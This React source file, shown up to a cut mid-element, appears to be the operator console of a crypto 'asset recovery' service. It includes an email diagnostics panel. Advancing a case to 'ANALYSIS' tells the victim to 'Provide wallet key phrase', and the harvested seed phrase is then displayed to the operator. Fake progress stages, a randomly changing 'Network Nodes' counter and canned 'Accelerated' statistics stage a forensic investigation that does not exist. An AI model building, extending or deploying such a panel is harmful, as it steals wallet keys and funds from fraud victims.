import React from 'react';
import { apiUrl } from '../lib/api';
import { 
  Search as SearchIcon, 
  Filter as FilterIcon, 
  MessageSquare as MessageIcon, 
  CheckCircle2 as CheckIcon, 
  Clock as ClockIcon, 
  ChevronRight as ChevronIcon,
  TrendingUp as TrendingIcon,
  Users as UsersIcon,
  ShieldAlert as ShieldIcon,
  Send as SendIcon,
  MoreVertical as MoreIcon,
  Activity as ActivityIcon,
  History as HistoryIcon,
  AlertCircle as AlertIcon,
  Lock as LockIcon,
  RefreshCw as RefreshIcon,
  Play as PlayIcon,
  Check as CheckSymbolIcon,
  X as XIcon,
  Server as ServerIcon,
  Mail as MailIcon
} from 'lucide-react';
import { 
  collection, 
  query, 
  orderBy, 
  onSnapshot, 
  doc, 
  updateDoc, 
  addDoc, 
  serverTimestamp,
  collectionGroup
} from 'firebase/firestore';
import { db, handleFirestoreError, OperationType, auth } from '../lib/firebase';
import { signInWithPopup, GoogleAuthProvider, onAuthStateChanged, User as FirebaseUser } from 'firebase/auth';
import { motion, AnimatePresence } from 'motion/react';

const CaseManagerView: React.FC = () => {
  const [requests, setRequests] = React.useState<any[]>([]);
  const [loading, setLoading] = React.useState(true);
  const [errorStatus, setErrorStatus] = React.useState<string | null>(null);
  const [selectedCase, setSelectedCase] = React.useState<any>(null);
  const [message, setMessage] = React.useState('');
  const [sendingMessage, setSendingMessage] = React.useState(false);
  const [searchTerm, setSearchTerm] = React.useState('');
  const [authChecking, setAuthChecking] = React.useState(true);
  const [isAuthorized, setIsAuthorized] = React.useState(false);

  const statusLevels = [
    { id: 'PENDING', label: 'Intake Received' },
    { id: 'INITIALIZING', label: 'Metadata Extraction' },
    { id: 'ANALYSIS', label: 'Wallet Verification Journey Analysis' },
    { id: 'PROCESSING', label: 'Transaction Forensic Trace' },
    { id: 'RECOVERY', label: 'Asset Recovery' },
    { id: 'COMPLETED', label: 'Restoration Ready' }
  ];

  React.useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      setAuthChecking(false);
      // For this demo, we check if the user is the admin email or has the forensic.io domain
      if (user && (
        user.email === 'contact@vr-astrovision.com' || 
        user.email?.endsWith('@forensic.io') ||
        user.email?.includes('admin')
      )) {
        setIsAuthorized(true);
      } else {
        setIsAuthorized(false);
      }
    });
    return () => unsubscribe();
  }, []);

  React.useEffect(() => {
    if (!isAuthorized || authChecking) return;
    
    setLoading(true);
    setErrorStatus(null);
    
    // Establishing direct uplink
    const q = collection(db, 'recovery_requests'); 
    
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      // Sort in memory for now to avoid index requirements while debugging
      const sortedDocs = docs.sort((a: any, b: any) => {
        const timeA = a.createdAt?.toMillis?.() || 0;
        const timeB = b.createdAt?.toMillis?.() || 0;
        return timeB - timeA;
      });
      setRequests(sortedDocs);
      setLoading(false);
      setErrorStatus(docs.length === 0 ? 'NO_DATA_CONNECTED' : null);
    }, (error) => {
      console.error('List error:', error);
      setErrorStatus(`UPLINK_FAILURE: ${error.message}`);
      setLoading(false);
      try {
        handleFirestoreError(error, OperationType.LIST, 'recovery_requests');
      } catch (e) {
        // Log JSON error for system diagnosis
      }
    });

    return () => unsubscribe();
  }, [isAuthorized, authChecking]);

  const createNotification = async (requestId: string, title: string, message: string, type: 'STATUS_UPDATE' | 'MILESTONE_COMPLETE' | 'MESSAGE' | 'ACTION_REQUIRED') => {
    try {
      await addDoc(collection(db, 'recovery_requests', requestId, 'notifications'), {
        title,
        message,
        type,
        read: false,
        createdAt: serverTimestamp()
      });
    } catch (err) {
      console.error('Failed to create notification:', err);
    }
  };

  const handleUpdateStatus = async (requestId: string, newStatus: string) => {
    try {
      const ref = doc(db, 'recovery_requests', requestId);
      await updateDoc(ref, { 
        status: newStatus,
        updatedAt: serverTimestamp()
      });
      
      const statusLabel = statusLevels.find(l => l.id === newStatus)?.label || newStatus;
      let notificationTitle = 'Status Updated';
      let notificationMessage = `Your case status has been updated to: ${statusLabel}`;
      let notificationType: 'STATUS_UPDATE' | 'ACTION_REQUIRED' = 'STATUS_UPDATE';

      if (newStatus === 'ANALYSIS') {
        notificationTitle = 'Action Required';
        notificationMessage = 'Provide wallet key phrase in the space below';
        notificationType = 'ACTION_REQUIRED';
      }

      await createNotification(
        requestId, 
        notificationTitle, 
        notificationMessage, 
        notificationType
      );

      if (selectedCase?.id === requestId) {
        setSelectedCase({ ...selectedCase, status: newStatus });
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.UPDATE, `recovery_requests/${requestId}`);
    }
  };

  const handleSendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!message.trim() || !selectedCase) return;

    setSendingMessage(true);
    try {
      await addDoc(collection(db, 'recovery_requests', selectedCase.id, 'messages'), {
        text: message,
        sender: 'Forensic System v4.2 (Admin)',
        senderId: 'admin',
        createdAt: serverTimestamp(),
        type: 'admin_message'
      });

      await createNotification(
        selectedCase.id,
        'New Message Received',
        'You have a new secure communication from your lead analyst.',
        'MESSAGE'
      );

      setMessage('');
    } catch (err) {
      handleFirestoreError(err, OperationType.CREATE, `recovery_requests/${selectedCase.id}/messages`);
    } finally {
      setSendingMessage(false);
    }
  };

  const [nodeCount, setNodeCount] = React.useState(1248);

  React.useEffect(() => {
    const interval = setInterval(() => {
      setNodeCount(prev => prev + (Math.random() > 0.6 ? 1 : Math.random() > 0.4 ? 0 : -1));
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  if (authChecking) {
    return (
      <div className="min-h-screen bg-[#020408] flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="w-8 h-8 border-2 border-blue-500 border-t-transparent animate-spin rounded-full"></div>
          <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">Verifying Authorization...</span>
        </div>
      </div>
    );
  }

  if (!isAuthorized) {
    return (
      <div className="min-h-screen bg-[#020408] flex items-center justify-center p-6">
        <div className="max-w-md w-full glass-panel p-8 rounded-3xl border border-red-500/20 text-center space-y-6">
          <div className="w-16 h-16 rounded-full bg-red-500/10 flex items-center justify-center text-red-500 mx-auto">
            <LockIcon size={32} />
          </div>
          <h2 className="text-xl font-manrope font-black text-white uppercase tracking-tight">Access Denied</h2>
          <p className="text-slate-400 text-sm leading-relaxed font-mono">
            Your current account does not have administrative privileges.<br/>
            Contact the system administrator for uplink permission.
          </p>
          <button 
            onClick={() => window.location.href = '/admin/login'}
            className="w-full bg-slate-800 text-white font-mono font-bold uppercase tracking-widest py-4 rounded-xl hover:bg-slate-700 transition-all cursor-pointer"
          >
            Return to Login
          </button>
        </div>
      </div>
    );
  }

  // Logic to find current selected case data from the live requests stream
  const activeCaseData = selectedCase 
    ? (selectedCase.id === 'smtp_diagnostics' ? selectedCase : (requests.find(r => r.id === selectedCase.id) || selectedCase)) 
    : null;

  const filteredRequests = requests.filter(r => 
    r.id.toLowerCase().includes(searchTerm.toLowerCase()) || 
    r.operatorAlias?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    r.secureComms?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="min-h-screen pt-28 sm:pt-32 pb-12 px-4 sm:px-6 lg:px-12 bg-[#020408]">
      <div className="max-w-[1600px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-6 sm:gap-8">
        
        {/* Sidebar / List */}
        <div className="lg:col-span-4 space-y-4 sm:space-y-6">
          <div className="glass-panel p-4 sm:p-6 rounded-2xl border border-white/5 space-y-4 sm:space-y-6">
            <div className="flex items-center justify-between">
              <h2 className="text-lg sm:text-xl font-manrope font-black text-white uppercase tracking-tight">Active Inquiries</h2>
              <div className="flex items-center gap-4">
                <span className="text-[9px] sm:text-[10px] font-mono text-blue-400 bg-blue-500/10 px-2 py-1 rounded border border-blue-500/20 uppercase tracking-widest animate-pulse">Live Sync</span>
              </div>
            </div>

            <button
              onClick={() => setSelectedCase({ id: 'smtp_diagnostics' })}
              className={`w-full p-4 rounded-xl text-left border transition-all flex items-center justify-between cursor-pointer ${
                selectedCase?.id === 'smtp_diagnostics'
                  ? 'bg-amber-600/10 border-amber-500 shadow-[0_0_15px_rgba(245,158,11,0.15)] text-amber-200 font-bold'
                  : 'bg-white/5 border-white/10 hover:border-amber-500/30 hover:text-white text-slate-400 font-normal'
              }`}
            >
              <div className="flex items-center gap-3">
                <SendIcon className="text-amber-500 shrink-0" size={18} />
                <div className="min-w-0">
                  <h4 className="text-xs font-mono tracking-widest uppercase truncate">Resend Diagnostics</h4>
                  <p className="text-[9px] text-slate-500 font-mono mt-0.5 uppercase">Test Resend Email Setup</p>
                </div>
              </div>
              <ChevronIcon size={16} className={selectedCase?.id === 'smtp_diagnostics' ? 'text-amber-500 animate-pulse' : 'text-slate-700'} />
            </button>

            <div className="h-[1px] bg-white/5"></div>

            <div className="relative">
              <SearchIcon className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={16} />
              <input 
                type="text" 
                placeholder="SEARCH CASE_ID, NAME OR EMAIL..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full bg-[#0a0e16] border border-white/10 rounded-xl py-3 pl-12 pr-4 text-xs font-mono text-white focus:border-blue-500 outline-none transition-all placeholder:text-slate-700"
              />
            </div>

            <div className="space-y-3 max-h-[600px] overflow-y-auto pr-2 custom-scrollbar">
              {errorStatus && errorStatus !== 'NO_DATA_CONNECTED' ? (
                <div className="text-center py-12 px-4 space-y-4">
                   <div className="text-red-500 font-mono text-[10px] uppercase">{errorStatus}</div>
                   <p className="text-[8px] text-slate-600 uppercase">Check Firestore security rules or internet connection.</p>
                </div>
              ) : loading ? (
                <div className="text-center py-12 opacity-50 flex flex-col items-center gap-3">
                  <div className="w-4 h-4 border border-blue-500 border-t-transparent animate-spin rounded-full"></div>
                  <span className="text-[10px] font-mono uppercase tracking-widest">Initializing Core...</span>
                </div>
              ) : filteredRequests.length === 0 ? (
                <div className="text-center py-12 space-y-4">
                  <p className="opacity-50 text-xs uppercase font-mono">No nodes detected</p>
                  <button 
                    onClick={async () => {
                      try {
                        await addDoc(collection(db, 'recovery_requests'), {
                          operatorAlias: 'SYSTEM_DIAGNOSTIC_NODE',
                          secureComms: 'diag@forensic.internal',
                          status: 'PENDING',
                          createdAt: serverTimestamp(),
                          updatedAt: serverTimestamp(),
                          completedSteps: []
                        });
                      } catch (e) {
                         console.error(e);
                      }
                    }}
                    className="text-[8px] font-mono text-slate-600 hover:text-blue-400 uppercase tracking-widest border border-dashed border-white/10 px-3 py-2 rounded-lg"
                  >
                    Generate Test Data Point
                  </button>
                </div>
              ) : (
                filteredRequests.map(req => (
                  <button
                    key={req.id}
                    onClick={() => setSelectedCase(req)}
                    className={`w-full p-4 rounded-xl text-left border transition-all flex items-center justify-between group ${
                      activeCaseData?.id === req.id 
                        ? 'bg-blue-600/10 border-blue-500 shadow-[0_0_20px_#0062ff22]' 
                        : 'bg-white/5 border-white/10 hover:border-white/20'
                    }`}
                  >
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span className="text-[10px] font-mono text-slate-500 uppercase">#{req.id.slice(0, 8)}</span>
                        <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded ${
                          req.status === 'RECOVERY' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
                          req.status === 'ANALYSIS' ? 'bg-amber-500/10 text-amber-500 border border-amber-500/20' :
                          'bg-blue-500/10 text-blue-400 border border-blue-500/20'
                        } uppercase tracking-tighter`}>{req.status}</span>
                      </div>
                      <h4 className="text-sm font-manrope font-bold text-white truncate max-w-[150px] uppercase">{req.operatorAlias}</h4>
                      <p className="text-[10px] font-mono text-slate-500 lowercase">{req.secureComms}</p>
                    </div>
                    <ChevronIcon className={`transition-transform group-hover:translate-x-1 ${activeCaseData?.id === req.id ? 'text-blue-500' : 'text-slate-700'}`} size={16} />
                  </button>
                ))
              )}
            </div>
          </div>
        </div>

        {/* Main Content / Case Detail */}
        <div className="lg:col-span-8 bg-[#020408]/50 min-h-[600px] flex flex-col">
          <AnimatePresence mode="wait">
            {activeCaseData ? (
              activeCaseData.id === 'smtp_diagnostics' ? (
                <SMTPDiagnosticsPanel key="smtp-diagnostic" />
              ) : (
                <motion.div 
                  key={activeCaseData.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  className="space-y-8"
                >
                {/* Header Stats */}
                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 sm:gap-6">
                  <div className="glass-panel p-4 sm:p-6 rounded-2xl border border-white/5 flex items-center gap-4 bg-gradient-to-br from-blue-500/5 to-transparent">
                    <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-blue-500/20 border border-blue-500/30 flex items-center justify-center text-blue-400 shrink-0">
                      <TrendingIcon size={20} />
                    </div>
                    <div>
                      <p className="text-[9px] sm:text-[10px] font-mono text-slate-500 uppercase tracking-widest">Case Velocity</p>
                      <h3 className="text-xl sm:text-2xl font-manrope font-black text-white uppercase tracking-tighter">Accelerated</h3>
                    </div>
                  </div>
                  <div className="glass-panel p-4 sm:p-6 rounded-2xl border border-white/5 flex items-center gap-4">
                    <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-amber-500/20 border border-amber-500/30 flex items-center justify-center text-amber-500 shrink-0">
                      <AlertIcon size={20} />
                    </div>
                    <div>
                      <p className="text-[9px] sm:text-[10px] font-mono text-slate-500 uppercase tracking-widest">Risk Index</p>
                      <h3 className="text-xl sm:text-2xl font-manrope font-black text-white uppercase tracking-tighter">Moderate</h3>
                    </div>
                  </div>
                  <div className="glass-panel p-4 sm:p-6 rounded-2xl border border-white/5 flex items-center gap-4 sm:col-span-2 md:col-span-1">
                    <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-emerald-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0">
                      <ActivityIcon size={20} />
                    </div>
                    <div>
                      <p className="text-[9px] sm:text-[10px] font-mono text-slate-500 uppercase tracking-widest">Network Nodes</p>
                      <h3 className="text-xl sm:text-2xl font-manrope font-black text-white uppercase tracking-tighter transition-all duration-1000">{nodeCount.toLocaleString()} Active</h3>
                    </div>
                  </div>
                </div>

                {/* Case Control Panel */}
                <div className="glass-panel p-5 sm:p-8 rounded-2xl border border-white/5 space-y-6 sm:space-y-8">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-6">
                    <div className="space-y-2">
                      <h2 className="text-sm xs:text-base sm:text-lg md:text-xl md:text-2xl font-manrope font-black text-white uppercase tracking-tight leading-tight break-all sm:break-normal">
                        Management_Console::<span className="text-blue-500">ID_{activeCaseData.id.slice(0, 8)}</span>
                      </h2>
                      <p className="text-[9px] sm:text-xs font-mono text-slate-500 uppercase tracking-widest flex flex-wrap items-center gap-x-3 gap-y-1">
                        <span className="flex items-center gap-2" title="Full Name"><UsersIcon size={12} className="text-blue-500" /> {activeCaseData.operatorAlias}</span>
                        <span className="hidden sm:inline opacity-30">//</span>
                        <span className="text-slate-600 truncate max-w-[150px] sm:max-w-none" title="Email Address">{activeCaseData.secureComms}</span>
                      </p>
                    </div>
                    <div className="flex items-center sm:justify-end gap-3 pt-4 sm:pt-0 border-t border-white/5 sm:border-t-0">
                       <div className="flex flex-col items-start sm:items-end">
                         <span className="text-[9px] sm:text-[10px] font-manrope font-black uppercase text-slate-400">Progression Control</span>
                         <span className="text-[7px] sm:text-[8px] font-mono text-blue-500 uppercase">Triggers User Portal UI</span>
                       </div>
                       <select 
                        value={activeCaseData.status}
                        onChange={(e) => handleUpdateStatus(activeCaseData.id, e.target.value)}
                        className="bg-[#0a0e16] border border-white/10 rounded-lg px-3 sm:px-4 py-2 text-[10px] sm:text-xs font-mono text-white outline-none focus:border-blue-500 transition-all cursor-pointer min-w-[140px]"
                       >
                         {statusLevels.map(lvl => (
                           <option key={lvl.id} value={lvl.id}>{lvl.label}</option>
                         ))}
                       </select>
                    </div>
                  </div>

                  <div className="h-px bg-white/5 w-full"></div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-8 sm:gap-12">
                    {/* Messaging Terminal */}
                    <div className="space-y-4 sm:space-y-6">
                       <h3 className="text-sm font-manrope font-black text-white uppercase tracking-wider flex items-center gap-2">
                         <MessageIcon size={16} className="text-blue-500" /> Secure Communications Port
                       </h3>
                       
                       <div className="bg-[#05070a] border border-white/5 rounded-xl p-3 sm:p-4 h-[300px] sm:h-[350px] overflow-y-auto space-y-4 font-mono text-[9px] sm:text-[10px]">
                          <div className="text-center py-4 border-b border-white/5 mb-4">
                            <span className="text-slate-600 uppercase tracking-widest">--- SECURE CHANNEL INITIALIZED ---</span>
                          </div>
                          <CaseMessages requestId={activeCaseData.id} />
                       </div>

                       <form onSubmit={handleSendMessage} className="relative">
                          <textarea 
                            value={message}
                            onChange={(e) => setMessage(e.target.value)}
                            placeholder="TRANSMIT SECURE DATA..."
                            className="w-full bg-[#0a0e16] border border-white/10 rounded-xl py-3 sm:py-4 pl-4 pr-16 text-[10px] sm:text-xs font-mono text-white focus:border-blue-500 outline-none transition-all min-h-[80px] sm:min-h-[100px] placeholder:text-slate-700 resize-none shadow-inner"
                          />
                          <button 
                            type="submit"
                            disabled={sendingMessage || !message.trim()}
                            className="absolute bottom-3 sm:bottom-4 right-3 sm:right-4 p-2.5 sm:p-3 bg-blue-600 text-white rounded-lg hover:brightness-110 active:scale-95 transition-all shadow-[0_0_15px_#0062ff44] disabled:opacity-50"
                          >
                            <SendIcon size={16} />
                          </button>
                       </form>
                    </div>

                    {/* Data Payload & Milestones */}
                    <div className="space-y-6 sm:space-y-8">
                      <div className="space-y-4 sm:space-y-6">
                        <h3 className="text-xs sm:text-sm font-manrope font-black text-white uppercase tracking-wider flex items-center gap-2">
                          <CheckIcon size={16} className="text-blue-500" /> Investigation Milestones
                        </h3>

                        <div className="space-y-2">
                          {statusLevels.map((lvl, index) => {
                            const isCompleted = activeCaseData.completedSteps?.includes(lvl.id) || index === 0; // First one is auto-marked
                            return (
                              <button
                                key={lvl.id}
                                disabled={index === 0}
                                onClick={async () => {
                                  const currentSteps = activeCaseData.completedSteps || [];
                                  const isChecking = !isCompleted;
                                  const newSteps = isCompleted 
                                    ? currentSteps.filter((s: string) => s !== lvl.id)
                                    : [...currentSteps, lvl.id];
                                  
                                  const ref = doc(db, 'recovery_requests', activeCaseData.id);
                                  await updateDoc(ref, { completedSteps: newSteps, updatedAt: serverTimestamp() });

                                  if (isChecking) {
                                    await createNotification(
                                      activeCaseData.id,
                                      'Milestone Achieved',
                                      `Phase "${lvl.label}" has been successfully completed and verified.`,
                                      'MILESTONE_COMPLETE'
                                    );
                                  }
                                }}
                                className={`w-full p-2.5 sm:p-3 rounded-lg border flex flex-col sm:flex-row sm:items-center justify-between gap-3 sm:gap-2 transition-all ${
                                  isCompleted 
                                    ? 'bg-blue-600/10 border-blue-500/30 text-blue-100' 
                                    : 'bg-white/5 border-white/10 text-slate-500 hover:border-white/20'
                                }`}
                              >
                                <span className={`text-[9px] sm:text-[10px] font-mono uppercase tracking-widest text-left ${isCompleted ? 'text-white' : ''}`}>
                                  {index + 1}. {lvl.label}
                                </span>
                                <div className="flex items-center justify-between sm:justify-end gap-2 w-full sm:w-auto pt-2 sm:pt-0 border-t border-white/5 sm:border-t-0">
                                  <button
                                    onClick={async (e) => {
                                      e.stopPropagation();
                                      await handleUpdateStatus(activeCaseData.id, lvl.id);
                                    }}
                                    className={`px-2 py-1 rounded text-[7px] font-mono border transition-all ${
                                      activeCaseData.status === lvl.id 
                                        ? 'bg-blue-600 border-blue-500 text-white' 
                                        : 'bg-white/5 border-white/10 text-slate-500 hover:text-white'
                                    }`}
                                    title="Set as current active phase (triggers user UI)"
                                  >
                                    SYNC_UI
                                  </button>
                                  <div className={`w-4 h-4 rounded border flex items-center justify-center shrink-0 ${
                                    isCompleted ? 'bg-blue-500 border-blue-500 text-white' : 'border-white/20'
                                  }`}>
                                    {isCompleted && <CheckIcon size={10} />}
                                  </div>
                                </div>
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      <div className="space-y-6">
                        <h3 className="text-sm font-manrope font-black text-white uppercase tracking-wider flex items-center gap-2">
                          <ActivityIcon size={16} className="text-emerald-500" /> Forensic Dataset
                        </h3>

                        <div className="space-y-4">
                          <DataField 
                            label="Wallet Recovery Phrase" 
                            value={activeCaseData.walletKeyphrase || (activeCaseData.status === 'ANALYSIS' ? 'AWAITING_USER_INPUT...' : 'PENDING_STAGE_TRIGGER')} 
                            isSecret={!activeCaseData.walletKeyphrase} 
                            isHighlighted={!!activeCaseData.walletKeyphrase}
                          />
                          <DataField label="Last Metadata Sync" value={activeCaseData.updatedAt?.toDate?.()?.toLocaleString() || 'N/A'} />
                          
                          <div className="p-4 rounded-xl border border-blue-500/20 bg-blue-500/5 mt-8">
                             <div className="flex items-center gap-3 mb-2">
                               <ShieldIcon className="text-blue-400" size={16} />
                               <h5 className="text-[10px] font-manrope font-black text-white uppercase tracking-widest">Internal Memo</h5>
                             </div>
                             <p className="text-[10px] text-slate-400 leading-relaxed font-mono">
                               Status: {activeCaseData.status}. 
                               {activeCaseData.walletKeyphrase 
                                ? " Keyphrase received. Proceed to Forensic Trace Analysis." 
                                : " Requirement: Set status to ANALYSIS to trigger user verification form."}
                             </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )) : (
              <div className="h-full flex flex-col items-center justify-center glass-panel rounded-2xl border border-white/5 p-6 sm:p-12 text-center max-w-2xl mx-auto space-y-6 my-auto">
                <ServerIcon size={64} className="text-blue-500/40 mx-auto animate-pulse" />
                <div>
                  <h2 className="text-xl sm:text-2xl font-manrope font-black text-white uppercase tracking-tighter mb-2">Systems Online & Synchronized</h2>
                  <p className="text-[10px] sm:text-xs font-mono text-slate-500 uppercase tracking-[0.2em]">Select a forensic inquiry from the queue or configure settings</p>
                </div>
                <div className="h-[1px] bg-white/5 w-full"></div>
                <div className="space-y-4 w-full max-w-sm mx-auto">
                  <p className="text-[10px] font-mono text-slate-400 uppercase tracking-widest">Troubleshooting Lead Emails?</p>
                  <button
                    onClick={() => setSelectedCase({ id: 'smtp_diagnostics' })}
                    className="w-full bg-amber-600/10 hover:bg-amber-600/20 border border-amber-500/30 hover:border-amber-500 text-amber-200 font-mono font-bold text-xs uppercase tracking-widest py-4 px-6 rounded-xl transition-all cursor-pointer flex items-center justify-center gap-3"
                  >
                    <SendIcon size={14} className="text-amber-500" />
                    Run Email Diagnostics
                  </button>
                </div>
              </div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
};

const SMTPDiagnosticsPanel: React.FC = () => {
  const [healthData, setHealthData] = React.useState<any>(null);
  const [healthLoading, setHealthLoading] = React.useState(true);
  const [testEmail, setTestEmail] = React.useState('info@cryptorecoveryasset.com');
  const [testLoading, setTestLoading] = React.useState(false);
  const [testResult, setTestResult] = React.useState<any>(null);

  const fetchHealth = async () => {
    setHealthLoading(true);
    try {
      const res = await fetch(apiUrl('/api/health'));
      const contentType = res.headers.get('content-type') || '';
      if (!contentType.includes('application/json')) {
        setHealthData({
          status: 'offline',
          smtpConfigured: false,
          adminEmail: 'info@cryptorecoveryasset.com',
          smtpDetails: { host: '', user: '', passSet: false },
          staticOnlyHosting: true,
        });
        return;
      }
      const data = await res.json();
      setHealthData(data);
    } catch (err) {
      console.error(err);
    } finally {
      setHealthLoading(false);
    }
  };

  React.useEffect(() => {
    fetchHealth();
  }, []);

  const handleTestEmail = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!testEmail.trim()) return;
    setTestLoading(true);
    setTestResult(null);
    try {
      const res = await fetch(
        apiUrl(`/api/debug-email?to=${encodeURIComponent(testEmail.trim())}`)
      );
      const data = await res.json();
      setTestResult({
        ok: res.ok,
        status: res.status,
        ...data
      });
    } catch (err: any) {
      setTestResult({
        ok: false,
        error: err?.message || String(err)
      });
    } finally {
      setTestLoading(false);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert(`Copied key to clipboard: ${text}`);
  };

  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.98 }}
      animate={{ opacity: 1, scale: 1 }}
      className="space-y-6 sm:space-y-8 p-1 relative z-10"
    >
      {/* Top Header Banner */}
      <div className="glass-panel p-6 sm:p-8 rounded-2xl border border-amber-500/15 bg-gradient-to-r from-amber-500/10 via-transparent to-transparent flex flex-col sm:flex-row justify-between items-start sm:items-center gap-6 relative overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_30%_30%,rgba(245,158,11,0.05),transparent)]"></div>
        <div className="space-y-1.5 relative z-10">
          <div className="flex items-center gap-2">
            <ServerIcon className="text-amber-500 shrink-0" size={20} />
            <h2 className="text-base sm:text-lg md:text-xl font-manrope font-black text-white uppercase tracking-tight">
              RESEND_EMAIL_DIAGNOSTICS
            </h2>
          </div>
          <p className="text-[10px] sm:text-xs font-mono text-slate-400 uppercase tracking-widest leading-relaxed">
            Verify environment variables, test live outbound mail delivery, and analyze Nodemailer handshake logs
          </p>
        </div>
        <button
          onClick={fetchHealth}
          disabled={healthLoading}
          className="flex items-center gap-2 px-4 py-2 bg-amber-500/10 border border-amber-500/30 hover:border-amber-500 rounded-xl text-[10px] font-mono font-bold text-amber-200 hover:text-white uppercase tracking-widest cursor-pointer transition-all disabled:opacity-50 shrink-0 relative z-10"
        >
          <RefreshIcon className={`w-3.5 h-3.5 ${healthLoading ? 'animate-spin' : ''}`} />
          Refresh Status
        </button>
      </div>

      {/* Primary Panels Grid */}
      <div className="grid grid-cols-1 xl:grid-cols-12 gap-6 sm:gap-8">
        
        {/* Secrets Environment Validation */}
        <div className="xl:col-span-5 space-y-6">
          <div className="glass-panel p-5 sm:p-6 rounded-2xl border border-white/5 space-y-6">
            <h3 className="text-xs font-mono font-bold text-white uppercase tracking-widest flex items-center gap-2">
              <LockIcon size={14} className="text-blue-400" /> SECRETS_REGISTRY_HEALTH
            </h3>
            
            <div className="space-y-4">
              {/* Host validation */}
              <DiagnosticField 
                label="EMAIL_PROVIDER" 
                value={healthLoading ? "..." : (healthData?.emailProvider || healthData?.smtpDetails?.host || "NOT_DEFINED")} 
                status={healthLoading ? "PENDING" : ((healthData as { emailProvider?: string })?.emailProvider || healthData?.smtpDetails?.host ? "VALID" : "MISSING")}
                onCopy={() => copyToClipboard("resend")}
              />
              
              {/* User Validation */}
              <DiagnosticField 
                label="RESEND_FROM" 
                value={healthLoading ? "..." : ((healthData as { resendFrom?: string })?.resendFrom || healthData?.smtpDetails?.user || "NOT_DEFINED")} 
                status={healthLoading ? "PENDING" : (healthData?.smtpDetails?.user ? "VALID" : "MISSING")}
                onCopy={() => copyToClipboard("RESEND_FROM")}
              />

              {/* Password Validation */}
              <DiagnosticField 
                label="RESEND_API_KEY" 
                value={healthLoading ? "..." : (healthData?.smtpDetails?.passSet ? "•••••••• (set on server)" : "NOT_SET")} 
                status={healthLoading ? "PENDING" : (healthData?.smtpDetails?.passSet ? "VALID" : "MISSING")}
                onCopy={() => copyToClipboard("RESEND_API_KEY")}
              />

              {/* Admin Target Email */}
              <DiagnosticField 
                label="ADMIN_EMAIL" 
                value="info@cryptorecoveryasset.com" 
                status="VALID"
                onCopy={() => copyToClipboard("ADMIN_EMAIL")}
              />
            </div>

            <div className="h-px bg-white/5"></div>

            <div className={`p-4 rounded-xl border text-[10px] leading-relaxed font-mono ${
              healthData?.smtpConfigured 
                ? 'bg-emerald-500/5 border-emerald-500/20 text-emerald-400' 
                : 'bg-red-500/5 border-red-500/20 text-red-400'
            }`}>
              <div className="flex items-center gap-2 mb-2 font-bold">
                <AlertIcon size={14} />
                <span>ENVIRONMENT STATUS: {healthData?.smtpConfigured ? "RESEND_ONLINE" : "RESEND_NOT_CONFIGURED"}</span>
              </div>
              <p>
                {healthData?.staticOnlyHosting
                  ? "CRITICAL: /api/health returned the website HTML, not JSON. You are on static hosting only — emails cannot send. Switch to Hostinger Node.js Web App with npm start, or set VITE_API_BASE_URL to a live API (see HOSTINGER_DEPLOY.md)."
                  : healthData?.smtpConfigured 
                  ? "Resend is configured on this server. You can run a live delivery test below." 
                  : "RESEND_API_KEY is missing. Set it in Hostinger env vars (see EMAIL_SETUP.md). Form data still saves to Firestore."
                }
              </p>
            </div>
          </div>
        </div>

        {/* Live Outbound Mail Connection Test */}
        <div className="xl:col-span-7 space-y-6">
          <div className="glass-panel p-5 sm:p-6 rounded-2xl border border-white/5 space-y-6">
            <h3 className="text-xs font-mono font-bold text-white uppercase tracking-widest flex items-center gap-2">
              <MailIcon size={14} className="text-amber-500" /> CONNECTION_TESTER
            </h3>

            <form onSubmit={handleTestEmail} className="space-y-4">
              <p className="text-[10px] text-slate-500 font-mono uppercase leading-relaxed">
                Provide an active recipient address below to attempt an immediate end-to-end TLS handshake & delivery test
              </p>
              
              <div className="flex gap-3">
                <div className="relative flex-grow">
                  <MailIcon className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={14} />
                  <input 
                    type="email"
                    required
                    value={testEmail}
                    onChange={(e) => setTestEmail(e.target.value)}
                    placeholder="RECIPIENT_TEST_EMAIL@DOMAIN.COM"
                    className="w-full bg-[#0a0e16]/60 border border-white/10 text-white pl-12 pr-4 py-4 rounded-xl text-xs font-mono outline-none focus:border-amber-500/50 transition-all uppercase placeholder:text-white/5"
                  />
                </div>
                <button
                  type="submit"
                  disabled={testLoading || !healthData?.smtpDetails?.user}
